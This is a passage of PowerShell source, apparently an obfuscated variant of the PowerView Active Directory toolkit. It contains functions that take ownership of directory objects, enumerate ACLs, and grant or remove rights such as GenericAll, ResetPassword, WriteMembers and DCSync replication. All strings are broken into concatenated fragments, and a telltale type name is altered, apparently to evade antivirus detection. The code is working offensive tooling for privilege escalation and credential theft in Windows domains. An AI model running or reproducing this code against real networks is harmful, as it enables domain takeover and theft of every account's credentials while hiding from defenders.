        [Alias(('Dis'+'t'+'ingu'+'ishedNa'+'me'), ('SamA'+'ccou'+'ntName'), ('Na'+'me'))]
        [String]
        $Identity,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias(('Ow'+'ner'))]
        [String]
        $OwnerIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('F'+'ilter'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(('ADS'+'Path'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('Dom'+'ainCon'+'tr'+'ol'+'ler'))]
        [String]
        $Server,

        [ValidateSet(('Ba'+'se'), ('One'+'Leve'+'l'), ('S'+'ubtre'+'e'))]
        [String]
        $SearchScope = ('Subt'+'ree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[('D'+'omain')]) { $SearcherArguments[('Doma'+'in')] = $Domain }
        if ($PSBoundParameters[('LDAPF'+'ilt'+'er')]) { $SearcherArguments[('LDAPF'+'ilt'+'er')] = $LDAPFilter }
        if ($PSBoundParameters[('S'+'earch'+'Base')]) { $SearcherArguments[('Sear'+'chB'+'ase')] = $SearchBase }
        if ($PSBoundParameters[('Se'+'rv'+'er')]) { $SearcherArguments[('Serv'+'er')] = $Server }
        if ($PSBoundParameters[('Searc'+'hS'+'cope')]) { $SearcherArguments[('Sea'+'rch'+'Scop'+'e')] = $SearchScope }
        if ($PSBoundParameters[('ResultP'+'ageS'+'i'+'ze')]) { $SearcherArguments[('ResultP'+'ageS'+'i'+'z'+'e')] = $ResultPageSize }
        if ($PSBoundParameters[('ServerTimeL'+'im'+'it')]) { $SearcherArguments[('Serve'+'rTi'+'meLi'+'m'+'it')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tom'+'bston'+'e')]) { $SearcherArguments[('Tombs'+'tone')] = $Tombstone }
        if ($PSBoundParameters[('C'+'re'+'dential')]) { $SearcherArguments[('Crede'+'n'+'tial')] = $Credential }

        $OwnerSid = &('Ge'+'t'+'-'+'Do'+'mainObject') @SearcherArguments -Identity $OwnerIdentity -Properties objectsid | &('Se'+'lect-'+'Object') -ExpandProperty objectsid
        if ($OwnerSid) {
            $OwnerIdentityReference = [System.Security.Principal.SecurityIdentifier]$OwnerSid
        }
        else {
            &('Write-'+'Warnin'+'g') ('['+'S'+'et'+'-D'+'o'+'mainObjectOw'+'ner'+'] '+'Er'+'ror '+'pa'+'rsin'+'g '+'owne'+'r '+'iden'+'tit'+'y '+"'$OwnerIdentity'")
        }
    }

    PROCESS {
        if ($OwnerIdentityReference) {
            $SearcherArguments[('Ra'+'w')] = $True
            $SearcherArguments[('Id'+'en'+'tity')] = $Identity

            $RawObject = &('Get'+'-D'+'oma'+'inOb'+'ject') @SearcherArguments

            ForEach ($Object in $RawObject) {
                try {
                    &('Write'+'-'+'V'+'erbose') ('[Set-DomainObj'+'ec'+'t'+'Owne'+'r]'+' '+'Attemptin'+'g'+' '+'to'+' '+'s'+'et '+'th'+'e '+'owner'+' '+'f'+'or '+"'$Identity' "+'t'+'o '+"'$OwnerIdentity'")
                    $Entry = $RawObject.GetDirectoryEntry()
                    $Entry.PsBase.Options.SecurityMasks = ('Ow'+'ner')
                    $Entry.PsBase.ObjectSecurity.SetOwner($OwnerIdentityReference)
                    $Entry.PsBase.CommitChanges()
                }
                catch {
                    &('Wri'+'t'+'e-War'+'n'+'ing') ('[Set'+'-Doma'+'inOb'+'je'+'c'+'tOwner]'+' '+'Erro'+'r '+'sett'+'in'+'g '+'o'+'wner: '+"$_")
                }
            }
        }
    }
}


function Get-DomainObjectAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'S'+'houldProc'+'ess'), '')]
    [OutputType(('Po'+'w'+'erBla.ACL'))]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Di'+'s'+'ti'+'ng'+'uishe'+'dName'), ('Sa'+'mAccountN'+'ame'), ('N'+'ame'))]
        [String[]]
        $Identity,

        [Switch]
        $Sacl,

        [Switch]
        $ResolveGUIDs,

        [String]
        [Alias(('Ri'+'ghts'))]
        [ValidateSet(('A'+'ll'), ('Res'+'etPas'+'sw'+'ord'), ('Wri'+'teMember'+'s'))]
        $RightsFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('Fil'+'t'+'er'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(('AD'+'SPath'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('D'+'o'+'m'+'ainControl'+'ler'))]
        [String]
        $Server,

        [ValidateSet(('B'+'ase'), ('One'+'Le'+'vel'), ('Subtr'+'e'+'e'))]
        [String]
        $SearchScope = ('S'+'u'+'btree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            ('Pr'+'op'+'erties') = ('sam'+'a'+'ccount'+'name,ntsecur'+'itydesc'+'ri'+'pt'+'or,disting'+'uishednam'+'e,objectsid')
        }

        if ($PSBoundParameters[('Sa'+'cl')]) {
            $SearcherArguments[('Se'+'cur'+'ity'+'Masks')] = ('Sac'+'l')
        }
        else {
            $SearcherArguments[('Secu'+'rity'+'Ma'+'sks')] = ('D'+'acl')
        }
        if ($PSBoundParameters[('Do'+'main')]) { $SearcherArguments[('Domai'+'n')] = $Domain }
        if ($PSBoundParameters[('Search'+'B'+'ase')]) { $SearcherArguments[('Sear'+'c'+'h'+'Base')] = $SearchBase }
        if ($PSBoundParameters[('S'+'erver')]) { $SearcherArguments[('Ser'+'ver')] = $Server }
        if ($PSBoundParameters[('Searc'+'hS'+'cope')]) { $SearcherArguments[('S'+'e'+'archScope')] = $SearchScope }
        if ($PSBoundParameters[('Res'+'ultPa'+'g'+'eSize')]) { $SearcherArguments[('Res'+'u'+'l'+'tPageSize')] = $ResultPageSize }
        if ($PSBoundParameters[('Ser'+'verTimeLi'+'mi'+'t')]) { $SearcherArguments[('ServerT'+'im'+'eLimit')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tom'+'bston'+'e')]) { $SearcherArguments[('To'+'m'+'bstone')] = $Tombstone }
        if ($PSBoundParameters[('Cr'+'eden'+'tial')]) { $SearcherArguments[('Crede'+'n'+'ti'+'al')] = $Credential }
        $Searcher = &('Get'+'-'+'DomainSearc'+'her') @SearcherArguments

        $DomainGUIDMapArguments = @{}
        if ($PSBoundParameters[('Domai'+'n')]) { $DomainGUIDMapArguments[('Doma'+'in')] = $Domain }
        if ($PSBoundParameters[('Serv'+'er')]) { $DomainGUIDMapArguments[('Serve'+'r')] = $Server }
        if ($PSBoundParameters[('Resul'+'tPageSiz'+'e')]) { $DomainGUIDMapArguments[('Resul'+'tP'+'ageSiz'+'e')] = $ResultPageSize }
        if ($PSBoundParameters[('Serve'+'rT'+'im'+'eLimit')]) { $DomainGUIDMapArguments[('S'+'e'+'rv'+'erTimeLimit')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Crede'+'nt'+'ial')]) { $DomainGUIDMapArguments[('C'+'r'+'ede'+'ntial')] = $Credential }

        if ($PSBoundParameters[('Res'+'olv'+'eGUIDs')]) {
            $GUIDs = &('G'+'et-Do'+'mai'+'nGUIDMa'+'p') @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if ($Searcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | &('Where'+'-Ob'+'j'+'ect') {$_} | &('F'+'or'+'Each-Obje'+'ct') {
                $IdentityInstance = $_.Replace('(', (('ko'+'P28')  -creplaCE ([ChaR]107+[ChaR]111+[ChaR]80),[ChaR]92)).Replace(')', (('lOV29') -CRepLacE([ChAr]108+[ChAr]79+[ChAr]86),[ChAr]92))
                if ($IdentityInstance -match ('^S-1-.'+'*')) {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match (('^(CNIgyOUIg'+'yDC'+')=.'+'*').replace('Igy','|'))) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters[('Domai'+'n')]) -and (-not $PSBoundParameters[('Search'+'B'+'ase')])) {
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(('D'+'C='))) -replace ('DC'+'='),'' -replace ',','.'
                        &('W'+'ri'+'te-Ver'+'bo'+'se') ('[Ge'+'t-Domai'+'nObjectAcl]'+' '+'Ext'+'ract'+'ed '+'d'+'omain'+' '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                        $SearcherArguments[('Doma'+'in')] = $IdentityDomain
                        $Searcher = &('G'+'et'+'-Dom'+'ainSea'+'rc'+'her') @SearcherArguments
                        if (-not $Searcher) {
                            &('Write-W'+'a'+'rning') ('['+'Get'+'-'+'DomainOb'+'j'+'ectAcl]'+' '+'Una'+'b'+'le '+'t'+'o '+'retr'+'i'+'e'+'ve '+'domai'+'n '+'sear'+'ch'+'er '+'fo'+'r '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | &('For'+'Each'+'-Ob'+'ject') { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters[('LDAPF'+'il'+'ter')]) {
                &('Wr'+'ite-Ve'+'rb'+'ose') ('[Ge'+'t-D'+'omain'+'Obj'+'ect'+'Ac'+'l] '+'Usin'+'g '+'addi'+'tio'+'nal '+'L'+'DAP '+'filte'+'r'+': '+"$LDAPFilter")
                $Filter += "$LDAPFilter"
            }

            if ($Filter) {
                $Searcher.filter = "(&$Filter)"
            }
            &('Write-V'+'erbos'+'e') "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter) "

            $Results = $Searcher.FindAll()
            $Results | &('W'+'he'+'re'+'-Object') {$_} | &('F'+'orE'+'a'+'ch-Obj'+'ect') {
                $Object = $_.Properties

                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $ObjectSid = (&('New-O'+'b'+'jec'+'t') System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $ObjectSid = $Null
                }

                try {
                    &('N'+'ew-'+'Object') Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object[('nts'+'ecur'+'it'+'ydescr'+'ip'+'to'+'r')][0], 0 | &('F'+'orE'+'ach-Ob'+'ject') { if ($PSBoundParameters[('S'+'acl')]) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | &('Fo'+'rEac'+'h-Ob'+'jec'+'t') {
                        if ($PSBoundParameters[('R'+'ightsFi'+'lte'+'r')]) {
                            $GuidFilter = Switch ($RightsFilter) {
                                ('ResetP'+'assw'+'o'+'r'+'d') { ('002995'+'7'+'0'+'-24'+'6d-11d0'+'-'+'a768-00aa0'+'06'+'e0529') }
                                ('Wr'+'ite'+'Membe'+'rs') { ('bf'+'9679c0'+'-'+'0de6-'+'11d0'+'-a28'+'5-'+'00a'+'a'+'003049e'+'2') }
                                Default { ('00'+'0000'+'00-0000-00'+'00'+'-00'+'00-00'+'000'+'0000000') }
                            }
                            if ($_.ObjectType -eq $GuidFilter) {
                                $_ | &('Ad'+'d-'+'Member') NoteProperty ('O'+'bje'+'ctDN') $Object.distinguishedname[0]
                                $_ | &('A'+'dd-Mem'+'ber') NoteProperty ('Ob'+'j'+'ec'+'tSID') $ObjectSid
                                $Continue = $True
                            }
                        }
                        else {
                            $_ | &('A'+'dd-Memb'+'er') NoteProperty ('Objec'+'t'+'DN') $Object.distinguishedname[0]
                            $_ | &('A'+'dd'+'-Me'+'mber') NoteProperty ('ObjectSI'+'D') $ObjectSid
                            $Continue = $True
                        }

                        if ($Continue) {
                            $_ | &('A'+'dd-M'+'ember') NoteProperty ('ActiveDi'+'r'+'ectory'+'Rig'+'ht'+'s') ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {
                                $AclProperties = @{}
                                $_.psobject.properties | &('ForEac'+'h-O'+'bjec'+'t') {
                                    if ($_.Name -match (('O'+'b'+'jectTy'+'p'+'e{'+'0}InheritedObje'+'ctType'+'{0}Ob'+'jec'+'t'+'A'+'ce'+'Typ'+'e{0}Inh'+'eri'+'tedObjec'+'tA'+'ce'+'Ty'+'p'+'e')  -F [CHAR]124)) {
                                        try {
                                            $AclProperties[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $AclProperties[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $AclProperties[$_.Name] = $_.Value
                                    }
                                }
                                $OutObject = &('New-Ob'+'jec'+'t') -TypeName PSObject -Property $AclProperties
                                $OutObject.PSObject.TypeNames.Insert(0, ('Power'+'B'+'la.ACL'))
                                $OutObject
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, ('P'+'owerBla'+'.AC'+'L'))
                                $_
                            }
                        }
                    }
                }
                catch {
                    &('Wri'+'t'+'e-Verbos'+'e') ('[Get'+'-Do'+'mainOb'+'j'+'ect'+'Ac'+'l] '+'E'+'r'+'ror: '+"$_")
                }
            }
        }
    }
}


function Add-DomainObjectAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSShouldPro'+'ces'+'s'), '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Dist'+'inguish'+'ed'+'Nam'+'e'), ('SamA'+'cco'+'un'+'t'+'Name'), ('Nam'+'e'))]
        [String[]]
        $TargetIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(('Filt'+'er'))]
        [String]
        $TargetLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(('D'+'o'+'mainCont'+'ro'+'ller'))]
        [String]
        $Server,

        [ValidateSet(('B'+'ase'), ('OneL'+'evel'), ('Su'+'btr'+'ee'))]
        [String]
        $SearchScope = ('Su'+'btre'+'e'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet(('A'+'ll'), ('Re'+'s'+'etP'+'assword'), ('WriteM'+'embe'+'rs'), ('D'+'CSync'))]
        [String]
        $Rights = ('Al'+'l'),

        [Guid]
        $RightsGUID
    )

    BEGIN {
        $TargetSearcherArguments = @{
            ('Propert'+'i'+'es') = ('disti'+'ngu'+'i'+'shednam'+'e')
            ('R'+'aw') = $True
        }
        if ($PSBoundParameters[('Targe'+'t'+'Doma'+'in')]) { $TargetSearcherArguments[('Do'+'main')] = $TargetDomain }
        if ($PSBoundParameters[('TargetL'+'DAP'+'Filter')]) { $TargetSearcherArguments[('LD'+'AP'+'Filter')] = $TargetLDAPFilter }
        if ($PSBoundParameters[('Tar'+'ge'+'tSearchBas'+'e')]) { $TargetSearcherArguments[('Sea'+'rchB'+'ase')] = $TargetSearchBase }
        if ($PSBoundParameters[('Ser'+'ver')]) { $TargetSearcherArguments[('Serve'+'r')] = $Server }
        if ($PSBoundParameters[('S'+'earc'+'hScop'+'e')]) { $TargetSearcherArguments[('Search'+'Scop'+'e')] = $SearchScope }
        if ($PSBoundParameters[('Res'+'u'+'l'+'tP'+'ageSize')]) { $TargetSearcherArguments[('Re'+'sult'+'Pag'+'eSize')] = $ResultPageSize }
        if ($PSBoundParameters[('Se'+'rv'+'erTimeLim'+'i'+'t')]) { $TargetSearcherArguments[('Se'+'rver'+'T'+'im'+'eLimit')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tombs'+'t'+'one')]) { $TargetSearcherArguments[('T'+'ombst'+'one')] = $Tombstone }
        if ($PSBoundParameters[('Cre'+'de'+'n'+'tial')]) { $TargetSearcherArguments[('Cr'+'ed'+'en'+'tial')] = $Credential }

        $PrincipalSearcherArguments = @{
            ('I'+'d'+'entity') = $PrincipalIdentity
            ('Prop'+'e'+'r'+'ties') = ('dis'+'ti'+'nguish'+'edn'+'a'+'me'+',o'+'bjectsid')
        }
        if ($PSBoundParameters[('P'+'ri'+'ncipal'+'Domain')]) { $PrincipalSearcherArguments[('Do'+'main')] = $PrincipalDomain }
        if ($PSBoundParameters[('S'+'erver')]) { $PrincipalSearcherArguments[('Se'+'rver')] = $Server }
        if ($PSBoundParameters[('SearchSco'+'p'+'e')]) { $PrincipalSearcherArguments[('Se'+'archSc'+'op'+'e')] = $SearchScope }
        if ($PSBoundParameters[('Res'+'u'+'ltP'+'a'+'geSize')]) { $PrincipalSearcherArguments[('Resul'+'tPageS'+'ize')] = $ResultPageSize }
        if ($PSBoundParameters[('ServerTi'+'m'+'e'+'Limit')]) { $PrincipalSearcherArguments[('Serve'+'rTim'+'eLimit')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tom'+'b'+'sto'+'ne')]) { $PrincipalSearcherArguments[('T'+'omb'+'stone')] = $Tombstone }
        if ($PSBoundParameters[('Cr'+'ede'+'ntial')]) { $PrincipalSearcherArguments[('Cr'+'edenti'+'al')] = $Credential }
        $Principals = &('G'+'et-Do'+'ma'+'inObject') @PrincipalSearcherArguments
        if (-not $Principals) {
            throw ('U'+'nabl'+'e '+'t'+'o '+'resolv'+'e '+'prin'+'cipa'+'l:'+' '+"$PrincipalIdentity")
        }
    }

    PROCESS {
        $TargetSearcherArguments[('Ident'+'it'+'y')] = $TargetIdentity
        $Targets = &('G'+'e'+'t-Do'+'mainObject') @TargetSearcherArguments

        ForEach ($TargetObject in $Targets) {

            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ('Non'+'e')
            $ControlType = [System.Security.AccessControl.AccessControlType] ('Allo'+'w')
            $ACEs = @()

            if ($RightsGUID) {
                $GUIDs = @($RightsGUID)
            }
            else {
                $GUIDs = Switch ($Rights) {
                    ('Re'+'setP'+'ass'+'word') { ('0'+'0299570-'+'246d-11'+'d'+'0-a76'+'8'+'-00aa006'+'e'+'0'+'529') }
                    ('Write'+'Mem'+'bers') { ('bf9679'+'c'+'0-'+'0'+'de'+'6-11'+'d0-'+'a2'+'85-00aa'+'003049e'+'2') }
                    ('DCSyn'+'c') { ('1'+'131f6aa-9c07-11d1-f7'+'9f'+'-0'+'0'+'c0'+'4fc2dcd2'), ('113'+'1f6'+'ad-9c0'+'7-'+'11d1'+'-f79'+'f'+'-00c04'+'fc2'+'dcd2'), ('89e9'+'5b7'+'6-444d-4c'+'62-9'+'9'+'1a-'+'0fac'+'be'+'da640'+'c')}
                }
            }

            ForEach ($PrincipalObject in $Principals) {
                &('Wr'+'ite-V'+'er'+'bose') "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) "

                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NewGUID = &('New-Obje'+'c'+'t') Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ('Extend'+'edR'+'ight')
                            $ACEs += &('Ne'+'w-Obj'+'ect') System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                        }
                    }
                    else {
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ('Gen'+'ericA'+'ll')
                        $ACEs += &('New-O'+'b'+'jec'+'t') System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                    }

                    ForEach ($ACE in $ACEs) {
                        &('W'+'r'+'ite-Verbose') "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname) "
                        $TargetEntry = $TargetObject.GetDirectoryEntry()
                        $TargetEntry.PsBase.Options.SecurityMasks = ('Dac'+'l')
                        $TargetEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
                        $TargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    &('Wr'+'ite-'+'Ver'+'bo'+'se') "[Add-DomainObjectAcl] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_ "
                }
            }
        }
    }
}


function Remove-DomainObjectAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'S'+'ho'+'uldPro'+'cess'), '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Dist'+'inguish'+'edNa'+'me'), ('S'+'amAccount'+'Nam'+'e'), ('N'+'ame'))]
        [String[]]
        $TargetIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(('F'+'i'+'lter'))]
        [String]
        $TargetLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(('Domai'+'nCon'+'trol'+'le'+'r'))]
        [String]
        $Server,

        [ValidateSet(('Bas'+'e'), ('O'+'neLeve'+'l'), ('Su'+'btr'+'ee'))]
        [String]
        $SearchScope = ('S'+'ub'+'tree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet(('A'+'ll'), ('Re'+'setPa'+'s'+'sword'), ('W'+'r'+'ite'+'Members'), ('DCS'+'y'+'nc'))]
        [String]
        $Rights = ('A'+'ll'),

        [Guid]
        $RightsGUID
    )

    BEGIN {
        $TargetSearcherArguments = @{
            ('Pro'+'pert'+'ies') = ('di'+'sti'+'n'+'guis'+'hedna'+'me')
            ('R'+'aw') = $True
        }
        if ($PSBoundParameters[('Ta'+'rgetD'+'omain')]) { $TargetSearcherArguments[('Domai'+'n')] = $TargetDomain }
        if ($PSBoundParameters[('T'+'argetLDAPFi'+'l'+'ter')]) { $TargetSearcherArguments[('L'+'DAP'+'Filter')] = $TargetLDAPFilter }
        if ($PSBoundParameters[('Targe'+'tSe'+'ar'+'c'+'hBase')]) { $TargetSearcherArguments[('Se'+'archBa'+'se')] = $TargetSearchBase }
        if ($PSBoundParameters[('Se'+'rv'+'er')]) { $TargetSearcherArguments[('S'+'erve'+'r')] = $Server }
        if ($PSBoundParameters[('Sea'+'rchSc'+'op'+'e')]) { $TargetSearcherArguments[('Sea'+'rch'+'S'+'cope')] = $SearchScope }
        if ($PSBoundParameters[('Resu'+'ltPag'+'eSiz'+'e')]) { $TargetSearcherArguments[('Res'+'u'+'ltP'+'ag'+'eSize')] = $ResultPageSize }
        if ($PSBoundParameters[('Ser'+'v'+'erTimeL'+'i'+'mit')]) { $TargetSearcherArguments[('Se'+'rverT'+'imeLimi'+'t')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tombs'+'t'+'one')]) { $TargetSearcherArguments[('Tom'+'b'+'stone')] = $Tombstone }
        if ($PSBoundParameters[('Cred'+'ent'+'i'+'al')]) { $TargetSearcherArguments[('C'+'re'+'dential')] = $Credential }

        $PrincipalSearcherArguments = @{
            ('Iden'+'ti'+'ty') = $PrincipalIdentity
            ('Prope'+'rtie'+'s') = ('di'+'s'+'ting'+'u'+'ishedna'+'me'+',object'+'s'+'id')
        }
        if ($PSBoundParameters[('Pri'+'n'+'cipalD'+'om'+'ain')]) { $PrincipalSearcherArguments[('Domai'+'n')] = $PrincipalDomain }
        if ($PSBoundParameters[('Serve'+'r')]) { $PrincipalSearcherArguments[('S'+'e'+'rver')] = $Server }
        if ($PSBoundParameters[('SearchS'+'cop'+'e')]) { $PrincipalSearcherArguments[('Se'+'arch'+'Scope')] = $SearchScope }
        if ($PSBoundParameters[('R'+'e'+'sultP'+'a'+'geSize')]) { $PrincipalSearcherArguments[('R'+'e'+'sultPageS'+'iz'+'e')] = $ResultPageSize }
        if ($PSBoundParameters[('Serv'+'erT'+'imeLimit')]) { $PrincipalSearcherArguments[('Serve'+'r'+'TimeLimi'+'t')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tom'+'b'+'stone')]) { $PrincipalSearcherArguments[('To'+'m'+'bst'+'one')] = $Tombstone }
        if ($PSBoundParameters[('Cre'+'de'+'ntial')]) { $PrincipalSearcherArguments[('Creden'+'ti'+'al')] = $Credential }
        $Principals = &('Ge'+'t-'+'Do'+'ma'+'inObje'+'ct') @PrincipalSearcherArguments
        if (-not $Principals) {
            throw ('Unabl'+'e '+'t'+'o '+'re'+'so'+'lve '+'pri'+'ncip'+'al: '+"$PrincipalIdentity")
        }
    }

    PROCESS {
        $TargetSearcherArguments[('I'+'denti'+'ty')] = $TargetIdentity
        $Targets = &('G'+'et-DomainOb'+'j'+'ec'+'t') @TargetSearcherArguments

        ForEach ($TargetObject in $Targets) {

            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ('N'+'one')
            $ControlType = [System.Security.AccessControl.AccessControlType] ('All'+'ow')
            $ACEs = @()

            if ($RightsGUID) {
                $GUIDs = @($RightsGUID)
            }
            else {
                $GUIDs = Switch ($Rights) {
                    ('ResetPa'+'sswo'+'rd') { ('0029'+'957'+'0-246'+'d-11'+'d'+'0'+'-a768-00aa006'+'e0'+'52'+'9') }
                    ('W'+'r'+'iteMembe'+'rs') { ('bf96'+'79'+'c0-0de6-'+'11d0-'+'a285-00aa00'+'30'+'49e2') }
                    ('DCS'+'ync') { ('1'+'1'+'31f6'+'a'+'a-'+'9'+'c07-11d1-f7'+'9'+'f'+'-00'+'c04fc2dcd2'), ('11'+'31f6ad-'+'9c07'+'-'+'11d1-f'+'79f-0'+'0c04fc'+'2dc'+'d2'), ('8'+'9e95b76-444d-4'+'c62-'+'991a-0'+'fa'+'c'+'beda640c')}
                }
            }

            ForEach ($PrincipalObject in $Principals) {
                &('Write'+'-V'+'erbose') "[Remove-DomainObjectAcl] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) "

                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NewGUID = &('New'+'-Obj'+'ect') Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ('Ex'+'tende'+'dR'+'igh'+'t')
                            $ACEs += &('New'+'-'+'Ob'+'ject') System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                        }
                    }
                    else {
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ('Gen'+'eri'+'cAll')
                        $ACEs += &('Ne'+'w-O'+'bject') System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                    }

                    ForEach ($ACE in $ACEs) {
                        &('Write-V'+'e'+'rbo'+'se') "[Remove-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname) "
                        $TargetEntry = $TargetObject.GetDirectoryEntry()
                        $TargetEntry.PsBase.Options.SecurityMasks = ('D'+'acl')
                        $TargetEntry.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
                        $TargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    &('W'+'ri'+'te-Ve'+'rbose') "[Remove-DomainObjectAcl] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_ "
                }
            }
        }
    }
}


function Find-InterestingDomainAcl {


